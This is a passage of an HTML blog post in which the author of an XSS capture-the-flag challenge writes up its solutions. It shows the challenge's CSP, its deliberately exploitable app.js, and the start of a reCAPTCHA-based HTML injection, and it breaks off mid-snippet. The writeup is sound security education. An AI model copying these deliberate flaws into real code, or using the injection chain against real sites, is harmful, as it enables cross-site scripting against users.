@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="en">
+<head>
+    <meta charset="utf-8">
+<title>Notes XSS Challenge Author Writeup - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2022/04/13/notes-challenge-author-writeup/" rel="alternate" hreflang="zh-TW" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2022/04/13/en/notes-challenge-author-writeup/">
+    
+
+
+
+
+
+    <meta name="description" content="Last month, I created an XSS challenge and hosted it on my GitHub: https:&#x2F;&#x2F;aszx87410.github.io&#x2F;xss-challenge&#x2F;notes&#x2F;  This is the writeup about the challenge and solutions, including intended and unint">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Notes XSS Challenge Author Writeup">
+<meta property="og:url" content="https://blog.huli.tw/2022/04/13/en/notes-challenge-author-writeup/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="Last month, I created an XSS challenge and hosted it on my GitHub: https:&#x2F;&#x2F;aszx87410.github.io&#x2F;xss-challenge&#x2F;notes&#x2F;  This is the writeup about the challenge and solutions, including intended and unint">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.huli.tw/img/notes-challenge-author-writeup/cover-en.png">
+<meta property="article:published_time" content="2022-04-13T07:43:37.000Z">
+<meta property="article:modified_time" content="2023-06-20T05:46:56.924Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/notes-challenge-author-writeup/cover-en.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="Notes XSS Challenge Author Writeup" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=3.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/en">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/en/archives">Archive</a>
+            
+            <a class="navbar-item "
+               href="/en/categories">Categories</a>
+            
+            <a class="navbar-item "
+               href="/en/about">About</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Table of Contents">
+                    Table of Contents
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#overview">1&nbsp;&nbsp;<b>Overview</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#recaptcha-to-the-rescue">1.1&nbsp;&nbsp;reCAPTCHA to the rescue</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#dom-clobbering">1.2&nbsp;&nbsp;DOM clobbering</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#load-external-script">1.3&nbsp;&nbsp;Load external script</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#angularjs-csp-bypass">1.4&nbsp;&nbsp;AngularJS CSP bypass</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#piece-all-together">1.5&nbsp;&nbsp;Piece all together</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#unintended">2&nbsp;&nbsp;<b>Unintended</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#unintended-1-by-maple3142">2.1&nbsp;&nbsp;Unintended #1 by @maple3142</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#unintended-2-by-smaury92">2.2&nbsp;&nbsp;Unintended #2 by @smaury92</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#unintended-3-by-lbrnli1234">2.3&nbsp;&nbsp;Unintended #3 by @lbrnli1234</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#unintended-4-by-lbrnli1234">2.4&nbsp;&nbsp;Unintended #4 by @lbrnli1234</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#takeaways">3&nbsp;&nbsp;<b>Takeaways</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+               <a class="navbar-item" href="/2022/04/13/notes-challenge-author-writeup/">中文</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            Notes XSS Challenge Author Writeup
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2022-04-13T07:43:37.000Z" itemprop="datePublished">13 April 2022</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/en/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>Last month, I created an XSS challenge and hosted it on my GitHub: <a target="_blank" rel="noopener" href="https://aszx87410.github.io/xss-challenge/notes/">https://aszx87410.github.io/xss-challenge/notes/</a></p>
+<p><img src="https://user-images.githubusercontent.com/2755720/163002837-93e930a5-66f8-4ba2-a8cd-49ed906baab2.png" alt="螢幕快照 2022-04-12 下午11 16 21"></p>
+<p>This is the writeup about the challenge and solutions, including intended and unintended.</p>
+<p>I will start from the intended one.</p>
+<span id="more"></span>
+
+<h2><span id="overview">Overview</span></h2><p>Let’s look at the challenge, it’s a simple but compacted app with ~100 lines JS and not-so-strict CSP:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span>
+  <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span>
+  <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
+    default-src 'self';
+    script-src 'self' https://www.gstatic.com/ 
+     https://www.google.com/ 
+     https://cdnjs.cloudflare.com/ajax/libs/dompurify/;
+     
+    frame-src https://www.google.com/ https://recaptcha.google.com/;
+    style-src 'self' 'unsafe-inline';
+  <span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>app.js:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">encode</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>type<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">this</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">===</span> <span class="token string">'uri'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">===</span> <span class="token string">'json'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">===</span> <span class="token string">'base64'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">atob</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">const</span> inputContent <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#input-content'</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> renderer <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#renderer'</span><span class="token punctuation">)</span>
+document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#clear'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+  inputContent<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">""</span>
+<span class="token punctuation">&#125;</span>
+
+document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#reload'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+  <span class="token function">reloadRecaptchaScript</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#reload'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style <span class="token operator">=</span> <span class="token string">"display:none"</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function">onSubmit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> content <span class="token operator">=</span> inputContent<span class="token punctuation">.</span>value
+  <span class="token keyword">const</span> name <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'input[name=creator]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value
+  <span class="token keyword">const</span> qs <span class="token operator">=</span> <span class="token string">'name='</span> <span class="token operator">+</span> name<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">'uri'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&amp;content='</span> <span class="token operator">+</span> content<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">'uri'</span><span class="token punctuation">)</span>
+  window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search <span class="token operator">=</span> <span class="token string">'?'</span> <span class="token operator">+</span> qs
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function">loadScript</span><span class="token punctuation">(</span><span class="token parameter">src</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  script<span class="token punctuation">.</span>async <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+  script<span class="token punctuation">.</span>src <span class="token operator">=</span> src<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>script<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'jsonp'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>script<span class="token punctuation">.</span>src<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'jsonp'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'dangerous keyword detected'</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+  document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function">reloadRecaptchaScript</span><span class="token punctuation">(</span><span class="token parameter">index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token comment">// delay for a bit to not block main thread</span>
+  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'reload'</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> document<span class="token punctuation">.</span>scripts<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">const</span> element <span class="token operator">=</span> document<span class="token punctuation">.</span>scripts<span class="token punctuation">[</span>index<span class="token punctuation">]</span>
+    <span class="token keyword">const</span> src <span class="token operator">=</span> element<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>src<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'https://www.google.com/recaptcha/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'reload failed, invalid src'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    element<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span>
+    <span class="token function">loadScript</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function">sanitize</span><span class="token punctuation">(</span><span class="token parameter">html<span class="token punctuation">,</span> options <span class="token operator">=</span> defaultOptions</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">return</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>html<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+    <span class="token constant">FORBID_TAGS</span><span class="token operator">:</span> options<span class="token punctuation">.</span>blockTags <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token constant">FORBID_ATTR</span><span class="token operator">:</span> options<span class="token punctuation">.</span>blockAttrs <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token constant">FORCE_BODY</span><span class="token operator">:</span> options<span class="token punctuation">.</span>forceBody<span class="token punctuation">,</span>
+    <span class="token constant">WHOLE_DOCUMENT</span><span class="token operator">:</span> options<span class="token punctuation">.</span>wholeDocument<span class="token punctuation">,</span>
+    <span class="token constant">KEEP_CONTENT</span><span class="token operator">:</span> <span class="token operator">!</span>options<span class="token punctuation">.</span>removeContent<span class="token punctuation">,</span>
+    <span class="token constant">SANITIZE_DOM</span><span class="token operator">:</span> <span class="token operator">!</span>options<span class="token punctuation">.</span>allowDOM<span class="token punctuation">,</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function">loadData</span><span class="token punctuation">(</span><span class="token parameter">sanitizeOptions</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams
+  <span class="token keyword">const</span> name <span class="token operator">=</span> params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>
+  <span class="token keyword">const</span> content <span class="token operator">=</span> params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'content'</span><span class="token punctuation">)</span>
+
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>content<span class="token punctuation">)</span> <span class="token keyword">return</span>
+
+  <span class="token comment">// hide some elements, we don't need it</span>
+  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.title'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">'Note'</span>
+  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.input-type'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style <span class="token operator">=</span> <span class="token string">'display: none'</span><span class="token punctuation">;</span>
+  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.input-date'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style <span class="token operator">=</span> <span class="token string">'display: none'</span><span class="token punctuation">;</span>
+  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.input-mode'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style <span class="token operator">=</span> <span class="token string">'display: none'</span><span class="token punctuation">;</span>
+  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#input-content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style <span class="token operator">=</span> <span class="token string">'display: none'</span><span class="token punctuation">;</span>
+  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#submit'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style <span class="token operator">=</span> <span class="token string">'display: none'</span><span class="token punctuation">;</span>
+  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#clear'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style <span class="token operator">=</span> <span class="token string">'display: none'</span><span class="token punctuation">;</span>
+  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#reload'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style <span class="token operator">=</span> <span class="token string">"display:none"</span>
+
+  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'input[name=creator]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> name
+  <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token function">sanitize</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> sanitizeOptions<span class="token punctuation">)</span>
+  renderer<span class="token punctuation">.</span>style <span class="token operator">=</span> <span class="token string">"width:100%; min-height: 400px;display: block"</span>
+  renderer<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> result
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">loadData</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">blockTags</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'style'</span><span class="token punctuation">,</span> <span class="token string">'iframe'</span><span class="token punctuation">,</span> <span class="token string">'embed'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'svg'</span><span class="token punctuation">,</span> <span class="token string">'script'</span><span class="token punctuation">,</span> <span class="token string">'math'</span><span class="token punctuation">,</span> <span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token string">'link'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">blockAttrs</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">forceBody</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">wholeDocument</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">allowDOM</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">removeContent</span><span class="token operator">:</span> <span class="token boolean">true</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>When the app is loaded, in <code>loadData</code> function, it reads data from the URL and then renders it to <code>innerHTML</code> after sanitized, that’s all.</p>
+<p>For sanitizing, the config is pretty much the default one, so you can’t perform XSS directly unless you find a 0-day bypass:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">sanitize</span><span class="token punctuation">(</span><span class="token parameter">html<span class="token punctuation">,</span> options <span class="token operator">=</span> defaultOptions</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">return</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>html<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+    <span class="token constant">FORBID_TAGS</span><span class="token operator">:</span> options<span class="token punctuation">.</span>blockTags <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token constant">FORBID_ATTR</span><span class="token operator">:</span> options<span class="token punctuation">.</span>blockAttrs <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token constant">FORCE_BODY</span><span class="token operator">:</span> options<span class="token punctuation">.</span>forceBody<span class="token punctuation">,</span>
+    <span class="token constant">WHOLE_DOCUMENT</span><span class="token operator">:</span> options<span class="token punctuation">.</span>wholeDocument<span class="token punctuation">,</span>
+    <span class="token constant">KEEP_CONTENT</span><span class="token operator">:</span> <span class="token operator">!</span>options<span class="token punctuation">.</span>removeContent<span class="token punctuation">,</span>
+    <span class="token constant">SANITIZE_DOM</span><span class="token operator">:</span> <span class="token operator">!</span>options<span class="token punctuation">.</span>allowDOM<span class="token punctuation">,</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">loadData</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">blockTags</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'style'</span><span class="token punctuation">,</span> <span class="token string">'iframe'</span><span class="token punctuation">,</span> <span class="token string">'embed'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'svg'</span><span class="token punctuation">,</span> <span class="token string">'script'</span><span class="token punctuation">,</span> <span class="token string">'math'</span><span class="token punctuation">,</span> <span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token string">'link'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">blockAttrs</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">forceBody</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">wholeDocument</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">allowDOM</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">removeContent</span><span class="token operator">:</span> <span class="token boolean">true</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>What can we do by injecting a harmless HTML? Not much, unless you leverage another functionality.</p>
+<h3><span id="recaptcha-to-the-rescue">reCAPTCHA to the rescue</span></h3><p>Somehow, the challenge uses Google reCAPTCHA, and from their <a target="_blank" rel="noopener" href="https://developers.google.com/recaptcha/docs/invisible#render_param">docs</a> we know that we can trigger a function call by injecting the following HTML:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span>
+  <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>g-recaptcha<span class="token punctuation">"</span></span>
+  <span class="token attr-name">data-sitekey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>AAA<span class="token punctuation">"</span></span>
